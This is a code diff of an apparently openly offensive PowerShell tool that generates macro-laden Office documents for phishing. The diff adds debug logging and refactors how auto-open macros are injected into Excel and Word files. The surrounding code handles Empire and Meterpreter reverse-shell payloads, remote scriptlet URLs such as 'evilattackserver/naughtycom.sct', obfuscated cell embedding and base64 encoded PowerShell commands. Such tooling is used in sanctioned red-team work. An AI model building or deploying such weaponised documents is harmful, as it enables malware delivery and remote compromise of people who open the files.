@@ -166,7 +166,7 @@ function Write-Message {
 		{
 			if ($symbol -ne $null)
 			{
-				$message = "[$symbol] - $message"
+				#$message = "[$symbol] - $message"
 			}
 			Add-Content $debuglog $message
 			Write-Text $symbol $color $message
@@ -502,6 +502,7 @@ function Get-ValidEXE($strpath)
 		Get-ValidEXE
 	}
 
+	Write-Message "GET-VALIDEXE: PATH: $path" "debug" -prependNewLine $true
 	return $path
 }
 
@@ -517,6 +518,7 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 	if ($title -eq $null)
 	{
 		$title = Read-Host -Prompt "`nTitle"
+		Write-Message "CREATE-DBPAYLOAD: TITLE: $title" "debug" -prependNewLine $true
 	}
 
     while ($title.Length -eq 0)
@@ -535,6 +537,11 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 	if ($destPort -eq $null) { $destPort = Read-Host -Prompt "Target Port [Optional]" }
 	if ($description -eq $null) { $description = Read-Host -Prompt "Description (e.g. empire, windows/meterpreter/reverse_tcp, etc) [Optional]"}
 	
+	Write-Message "CREATE-DBPAYLOAD: TITLE: $title" "debug" -prependNewLine $true
+	Write-Message "CREATE-DBPAYLOAD: DESTIP: $destIP" "debug" -prependNewLine $true
+	Write-Message "CREATE-DBPAYLOAD: DESTPORT: $destPort" "debug" -prependNewLine $true
+	Write-Message "CREATE-DBPAYLOAD: DESCRIPTION: $description" "debug" -prependNewLine $true
+
 	if ($payloadtype -eq -1)
 	{
 		Write-Message "`nChoose payload type: " 
@@ -542,7 +549,7 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 		{
 			Write-Message "`t$($t.ID)) $($t.Name)"
 		}
-		Write-Message "`t98) Wtf"
+		Write-Message "`t98) Help"
 		Do
 		{ 
 			$pt = Read-Host -Prompt "Selection"
@@ -554,6 +561,7 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 		until ($pt -as [int] -and ($pt -ge 1 -and $pt -le $payloadtypes.Count))
 
 		$payloadtype = $pt
+		Write-Message "CREATE-DBPAYLOAD: PAYLOADTYPE: $pt" "debug" -prependNewLine $true
 	}
 	
 	switch ($payloadtype)
@@ -595,6 +603,7 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 				$path = Read-Host -Prompt "Enter full path to .ps1 file"
 			}
 
+			Write-Message "CREATE-DBPAYLOAD: PATHTOPS1: $path" "debug" -prependNewLine $true
 			$payloadtext = Get-Content $path -Raw
 
 			try 
@@ -620,6 +629,7 @@ function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $descrip
 				Write-Message "Like this: http://evilattackserver/naughtycom.sct (also works with .txt files)." "warning" -prependNewLine $true
 				$comurl = Read-Host -Prompt "`Try again"
 			}
+			Write-Message "CREATE-DBPAYLOAD: COMURL: $comurl" "debug" -prependNewLine $true
 			$payloadtext = $comurl
 			$description = "$description ($comurl)"
 		}
@@ -666,6 +676,8 @@ function Remove-DBPayload()
 		}
 		until (($selection -ge 1 -and $selection -le $allcount)-or $selection -eq $exitnum)
 		
+		Write-Message "REMOVE-DBPAYLOAD: SELECTION: $selection" "debug" -prependNewLine $true
+
 		if ($selection -eq $exitnum)
 		{ 
 			Load-Menu $script:currentmenu 
@@ -734,6 +746,8 @@ function Create-DBTemplate($title=$null, $path=$null, $doctype=$null)
 		$doctype = [IO.Path]::GetExtension($path)
 	}
 
+	Write-Message "CREATE-DBTEMPLATE: PATH: $path" "debug" -prependNewLine $true
+
 	try 
 	{
 		$doctypeid = Get-DocTypeByName $doctype
@@ -772,6 +786,8 @@ function Remove-DBTemplate()
 		}
 		until (($selection -ge 1 -and $selection -le $tcount) -or $selection -eq $exitnum)
 		
+		Write-Message "REMOVE-DBTEMPLATE: SELECTION: $selection" "debug" -prependNewLine $true
+
 		if ($selection -eq $exitnum)
 		{ 
 			Load-Menu $script:currentmenu 
@@ -1214,6 +1230,7 @@ function Add-WorksheetPayloads([ref]$Workbook, [ref]$Worksheet, $activeworking, 
 	{
 		$legend = Parse-Legend $i.LegendString
 		$payload = Get-PayloadByID $i.PayloadID
+		$partscheck = $true
 
 		if ($i.IsEncrypted -eq 1)
 		{
@@ -1240,7 +1257,8 @@ function Add-WorksheetPayloads([ref]$Workbook, [ref]$Worksheet, $activeworking, 
 					}
 				}
 				8 { # Metadata attack
-					# Currently handled in Create-Excel (Section 5.1) due to what I believe to be a bug in the .Net framework.
+					# Currently handled in Create-Excel/Word (Section 5.1) due to what I believe to be a bug in the .Net framework.
+					$partscheck = $false
 				}
                 9 { # CellEmbed-Obfuscation
                     if ($can_obfuscate)
@@ -1264,7 +1282,7 @@ function Add-WorksheetPayloads([ref]$Workbook, [ref]$Worksheet, $activeworking, 
 			}
 		}
 
-		if ($parts -ne $null -and ($parts | measure).Count -ne 0)
+		if ($partscheck -and $parts -ne $null -and ($parts | measure).Count -ne 0)
 		{
 			if (($parts | measure).Count -eq $legend.NumRows)
 			{
@@ -1358,7 +1376,7 @@ function Do-FilePrereqs($existingpath, $filename=$null, $doctypename, $officever
 
 		$tmppath = $newpath
 		Copy-Item $existingpath $newpath
-		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $true -doctype $doctype.ID
+		#$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
 	}
 	else 
 	{
@@ -1371,7 +1389,7 @@ function Do-FilePrereqs($existingpath, $filename=$null, $doctypename, $officever
 			$newpath = "$script:payloadsdir\$filename.$doctypename"
 		}
 		
-		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
+		#$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
 	}
 
 	$OutlookKey = "HKLM:\SOFTWARE\Microsoft\Office\$officeversion\Outlook"
@@ -1474,6 +1492,80 @@ function Adjust-MacroSecurity($doctypename, $officeversion, $action)
 
 }
 
+function Get-MacroEntryPoint($document, $aostring, $doctypename)
+{
+	$name = $null
+    $aoLine = 0
+    $namefound = $false
+    $modulefound = $false
+
+	foreach ($comp in $document.VBProject.VBComponents)
+	{
+		$cm = $comp.CodeModule
+		if ($cm.Name -eq $name)
+		{
+			$namefound = $true
+		}
+		
+		Write-Message "GET-MACROENTRYPOINT: CM.NAME: $($cm.Name) - CM.COUNTOFLINES: $($cm.CountOfLines)" "debug"
+
+		switch ($doctypename)
+		{
+			"xls" 
+			{
+				if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "Sheet*")) -and (!($cm.Name -match "ThisWorkbook*")))
+				{
+					try
+					{ 	
+						$name = $cm.Name
+						$namefound = $true
+						$aoLine = $cm.ProcStartLine($aostring, [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) 
+					}
+					catch 
+					{ 
+						#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
+					}
+				}
+			}
+			"doc" 
+			{
+				if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "ThisDocument*")))
+				{
+					try
+					{ 	
+						$name = $cm.Name
+						$namefound = $true
+						$aoLine = $cm.ProcStartLine($aostring, [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) 
+					}
+					catch 
+					{ 
+						#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
+					}
+				}
+			}
+		}
+    }
+    
+    if ($name -eq $null)
+    {
+        switch ($doctypename)
+        {
+            "xls" { $name = "Sheet1" }
+            "doc" { $name = "ThisDocument" }
+        }
+    }
+
+	Write-Message "GET-MACROENTRYPOINT: NAME: $name" "debug"
+	Write-Message "GET-MACROENTRYPOINT: NAMEFOUND: $namefound" "debug"
+	Write-Message "GET-MACROENTRYPOINT: AOLINE: $aoLine" "debug"
+
+	return New-Object -TypeName psobject -Prop @{
+		'Name' = $name;
+        'aoLine' = $aoLine;
+        'NameFound' = $namefound
+	}
+}
+
 function Create-Excel($linelength, $ismodify, $existingpath, $istemplate, $filename=$null)
 {
 
@@ -1490,6 +1582,7 @@ function Create-Excel($linelength, $ismodify, $existingpath, $istemplate, $filen
 		$ExcelVersion = $Excel01.Version
 
 		$vars = Do-FilePrereqs $existingpath $filename "xls" $ExcelVersion
+		$doctype = Get-DocTypeByName "xls"
 
 		# 2. Add new workbook/worksheet
 		$Excel01.DisplayAlerts = $false
@@ -1523,55 +1616,47 @@ function Create-Excel($linelength, $ismodify, $existingpath, $istemplate, $filen
 		exit
 	}
 
-	# 4. Add the macro code
-	Write-Message "Adding macro to workbook." "status"
-
 	if ($ismodify)
 	{
 		# See if we can find Auto_Open and add our calls. 
+		$entry = Get-MacroEntryPoint $Workbook01 "Auto_Open" "xls"
+
 		foreach ($comp in $Workbook01.VBProject.VBComponents)
 		{
 			$cm = $comp.CodeModule
-			Write-Message "$($cm.Name)`t`tCount: $($cm.CountOfLines)" "debug"
-			if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "Sheet*")) -and (!($cm.Name -match "ThisWorkbook*"))) # Assumptions on my part, but safe ones. Only care about custom code modules.
-			{	
-				$aoLine = 0
-				# Find Auto_Open
-				try
-					{ $aoLine = $cm.ProcStartLine("Auto_Open", [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) }
-				catch 
-				{ 
-					#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
-				}
-				
+			if ($cm.Name -eq $entry.Name)
+			{
 				# If Auto_Open already exists, modify it.
-				if ($aoLine -gt 0)
+				if ($entry.aoLine -gt 0)
 				{
-					Write-Message "Auto_Open located at line $aoLine" 
-					$cm.InsertLines($aoLine + 2, $macroelements['autoopen-calls'])
+					$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
+					Write-Message "Auto Opener located at line $($entry.aoLine)" "status"
+					$cm.InsertLines($entry.aoLine + 2, $macroelements['autoopen-calls'])
 				}
 				else #otherwise create it.
 				{
-					Write-Message "Auto_Open not located. Creating it..."
-					$cm.InsertLines(1, $macroelements['autoopen'])
+					$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $true -doctype $doctype.ID
+					Write-Message "Auto Opener not located. Creating it..."
+					#$cm.InsertLines(1, $macroelements['autoopen'])
 				}
 			}
 		}
 
 		$ExcelModule.Name = "LinesOfBusiness"
-        if ($vars.macrocode.Length -gt 0)
+        if ($macrocode.Length -gt 0)
         {
-		    $ExcelModule.CodeModule.AddFromString($vars.macrocode)
+		    $ExcelModule.CodeModule.AddFromString($macrocode)
         }
 		Write-Message "Successfully created LinesOfBusiness Module" "debug"
 	}
 	else 
 	{
+		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
 		try
 		{ 	
-            if ($vars.macrocode.Length -gt 0)
+            if ($macrocode.Length -gt 0)
 			{			    
-				$ExcelModule.CodeModule.AddFromString($vars.macrocode) 
+				$ExcelModule.CodeModule.AddFromString($macrocode) 
 			}
 		}
 		catch
@@ -1695,6 +1780,7 @@ function Create-Word($linelength, $ismodify, $existingpath, $istemplate, $filena
 		$WordVersion = $Word.Version
 
 		$vars = Do-FilePrereqs $existingpath $filename "doc" $WordVersion
+		$doctype = Get-DocTypeByName "doc"
 
 		#Check for Office 2007 or Office 2003
 		if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
@@ -1726,47 +1812,42 @@ function Create-Word($linelength, $ismodify, $existingpath, $istemplate, $filena
 	if ($ismodify)
 	{
 		# See if we can find Auto_Open and add our calls. 
+		$entry = Get-MacroEntryPoint $Workbook01 "AutoOpen" "doc"
+
 		foreach ($comp in $Doc.VBProject.VBComponents)
 		{
 			$cm = $comp.CodeModule
-			Write-Message "$($cm.Name)`t`tCount: $($cm.CountOfLines)" "debug"
-			if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "Sheet*")) -and (!($cm.Name -match "ThisWorkbook*"))) # Assumptions on my part, but safe ones. Only care about custom code modules.
-			{	
-				$aoLine = 0
-				# Find Auto_Open
-				try
-					{ $aoLine = $cm.ProcStartLine("AutoOpen", [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) }
-				catch 
-				{ 
-					#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
-				}
-				
+			if ($cm.Name -eq $entry.Name)
+			{
 				# If Auto_Open already exists, modify it.
-				if ($aoLine -gt 0)
+				if ($entry.aoLine -gt 0)
 				{
-					Write-Message "AutoOpen located at line $aoLine" 
-					$cm.InsertLines($aoLine + 2, $macroelements['autoopen-calls'])
+					$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
+					Write-Message "AutoOpen located at line $($entry.aoLine)" 
+					$cm.InsertLines($entry.aoLine + 2, $macroelements['autoopen-calls'])
 				}
 				else #otherwise create it.
 				{
+					$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $true -doctype $doctype.ID
 					Write-Message "AutoOpen not located. Creating it..." "status"
-					$cm.InsertLines(1, $macroelements['autoopen'])
+					#$cm.InsertLines(1, $macroelements['autoopen'])
 				}
 			}
 		}
 
 		$DocModule.Name = "LinesOfBusiness"
-        if ($vars.macrocode.Length -gt 0)
+        if ($macrocode.Length -gt 0)
         {
-		    $DocModule.CodeModule.AddFromString($vars.macrocode)
+		    $DocModule.CodeModule.AddFromString($macrocode)
         }
-		Write-Message "Successfully created LinesOfBusiness Module" "debug"
+		Write-Message "CREATE-WORD: Successfully created LinesOfBusiness Module" "debug"
 	}
 	else 
 	{
-		if ($vars.macrocode.Length -gt 0)
+		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
+		if ($macrocode.Length -gt 0)
 		{			    
-			$DocModule.CodeModule.AddFromString($vars.macrocode) 
+			$DocModule.CodeModule.AddFromString($macrocode) 
 		}
 	}
 
@@ -1852,6 +1933,8 @@ function Create-FileFromTemplate($doctypename, $templateselection = $null, $file
 				$templateselection = Read-Host -Prompt "Select" 
 			}
 			until ($templateselection -as [int] -and ($templateselection -gt 0 -and $templateselection -le $tcount) -or $payloadselection -eq $exitnum)
+
+			Write-Message "CREATE-FILEFROMTEMPLATE: SELECTION: $templateselection" "debug" -prependNewLine $true
 		}
 		
 		if ($templateselection -eq $exitnum)
@@ -1870,7 +1953,7 @@ function Create-FileFromTemplate($doctypename, $templateselection = $null, $file
 			$tmppath = "$($script:payloadsdir)\template_$r.$doctypename"
 			$template = $templates | ?{$_.ListID -eq $templateselection}
 			$tbytes = [System.Convert]::FromBase64String($template.TemplateText)
-			Write-Message "TEMPLATE BYTE LENGTH: $($tbytes.Length)" "debug"
+			Write-Message "CREATE-FILEFROMTEMPLATE: TEMPLATE BYTE LENGTH: $($tbytes.Length)" "debug"
 			[System.IO.File]::WriteAllBytes($tmppath, $tbytes)
 
 			switch ($doctypename)
@@ -2013,6 +2096,8 @@ function Select-Payload()
 		}
 		until ($payloadselection -as [int] -and (($allpayloads | ?{$_.ListID -eq $payloadselection} | measure).Count -gt 0 -or $payloadselection -eq $exitnum))
 		
+		Write-Message "SELECT-PAYLOAD: PAYLOADSELECTION: $payloadselection" "debug" -prependNewLine $true
+
 		if ($payloadselection -eq $exitnum)
 		{ 
 			Load-Menu $script:currentmenu 
@@ -2027,7 +2112,7 @@ function Select-Payload()
 			{	
 				Write-Message "`t$($i.ListID))  $($i.Name)"
 			}
-			Write-Message "`t98) Wtf"
+			Write-Message "`t98) Help"
 			Write-Message "`n"
 
 			Do
@@ -2039,6 +2124,8 @@ function Select-Payload()
 				}
 			}
 			until ($itselection -as [int] -and ($itselection -ge ($it.ListID | measure -Minimum).Minimum -and $itselection -le ($it.ListID | measure -Maximum).Maximum))
+
+			Write-Message "SELECT-PAYLOAD: ITSELECTION: $itselection" "debug" -prependNewLine $true
 
 			$selectedit = ($it | ?{[int]$_.ListId -eq [int]$itselection}).ID
 			# Check for encryption
@@ -2057,13 +2144,15 @@ function Select-Payload()
 						$is64Bit = Read-Host "This is a binary situation. Y or N please."
 					}
 
+					Write-Message "SELECT-PAYLOAD: IS64BIT: $is64Bit" "debug" -prependNewLine $true
+
 					if ($is64bit -match "[Yy]")
 					{
-						$customstrings += "|SYSTYPE|,syswow64"
+						$customstrings += "|SYSTYPE|,System32"
 					}
 					else 
 					{	
-						$customstrings += "|SYSTYPE|,System32"
+						$customstrings += "|SYSTYPE|,syswow64"
 					}
 
 					# Add special record for IRPEI (47734) as well as main activeworking record.
@@ -2121,6 +2210,8 @@ function Unselect-Payload()
 		}
 		until (($active | ?{$_.ListID -eq $selection} | measure).Count -gt 0 -or $selection -eq $exitnum)
 		
+		Write-Message "REMOVE-PAYLOAD: SELECTION: $selection" "debug" -prependNewLine $true
+
 		$currentitem = $active | ?{ $_.ListID -eq $selection }
 
 		if (($currentitem | measure).Count -gt 0)
@@ -2189,6 +2280,7 @@ function Create-EncodedCommand()
 {
 	Write-Message "`n============== Encoder =============="
 	$selection = Read-Host -Prompt "`nEnter PS Command: "
+	Write-Message "CREATE-ENCODEDCOMMAND: SELECTION: $selection" "debug" -prependNewLine $true
 	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($selection)
 	$EncodedText =[Convert]::ToBase64String($Bytes)
 	$command = "powershell -W 1 -C `"powershell ([char]45+[char]101+[char]110+[char]99) $EncodedText`"" #Thanks @HackingDave!
@@ -2218,8 +2310,8 @@ function Show-Logo()
 		  $version - @curi0usJack
 		
 "@ 
-	
-	if ($API -eq $false) 
+
+	if (!$API) 
 	{
 		Write-Message $logo
 	}
@@ -2309,6 +2401,7 @@ function Invalid-Option()
 
 function Process-MenuOption($selection)
 {
+	Write-Message "PROCESS-MENUOPTIONS: SELECTION: $selection" "debug" -prependNewLine $true
 	switch ($script:currentmenu)
 	{
 		'main'		{
